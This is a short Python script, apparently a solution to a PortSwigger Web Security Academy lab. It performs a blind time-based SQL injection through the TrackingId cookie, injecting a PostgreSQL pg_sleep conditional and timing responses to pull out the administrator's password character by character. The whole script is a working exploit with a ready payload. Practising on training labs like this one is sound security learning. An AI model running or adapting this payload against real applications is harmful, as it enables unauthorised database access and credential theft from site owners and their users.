#!/usr/bin/python3

from pwn import *
import requests, signal, time, pdb, sys, string

def def_handler(sig,frame):
    print("\n\n[!] Saliendo...")
    sys.exit(1)

#Ctrl+C
signal.signal(signal.SIGINT,def_handler)

main_url = "https://0a2a002103f7a08380ef3f9000820082.web-security-academy.net"
characters = string.ascii_lowercase + string.digits

def makeRequest():

    password = ""

    p1 = log.progress("Fuerza bruta")
    p1.status("Iniciando fuerza bruta")

    time.sleep(2)

    p2 = log.progress("Password")

    for position in range(1, 21):
        for character in characters:

            cookies = {
                'TrackingId': "M2rB6PHfoIE49L5'||(select case when substring(password,%d,1)='%s' then pg_sleep(1.5) else pg_sleep(0) end from users where username='administrator')-- -" % (position, character),
                'session': "GfnvatEvtUPPPviwHef8042GvbwPVE89"            
            }

            p1.status(cookies['TrackingId'])

            time_start = time.time()

            r = requests.get(main_url, cookies=cookies)

            time_end = time.time()

            if time_end - time_start > 1.5:
                password += character
                p2.status(password)
                break

if __name__ == '__main__':

    makeRequest()
